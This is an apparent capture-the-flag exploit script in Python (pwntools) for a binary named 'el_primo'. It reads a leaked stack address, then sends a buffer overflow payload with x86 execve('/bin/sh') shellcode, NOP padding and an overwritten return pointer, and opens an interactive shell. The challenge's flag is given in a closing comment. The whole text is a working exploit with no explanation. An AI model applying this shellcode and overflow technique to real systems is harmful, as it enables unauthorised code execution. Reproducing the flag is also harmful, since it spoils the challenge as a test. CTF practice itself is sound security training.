from pwn import *

r = process('./el_primo')

r.recvline()
leak = int(r.recvline().strip().split(' ')[-1],16)
log.info("Leaked stack: {}".format(hex(leak)))

offset = 32
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = ""
payload += p32(leak+4) #point to shellcode
payload += shellcode
payload += "\x90" * (offset-len(payload))
payload += p32(leak+4) #point to leak +4

r.sendline(payload)
r.interactive()

# flag: tjctf{3L_PR1M0O0OOO!1!!} 
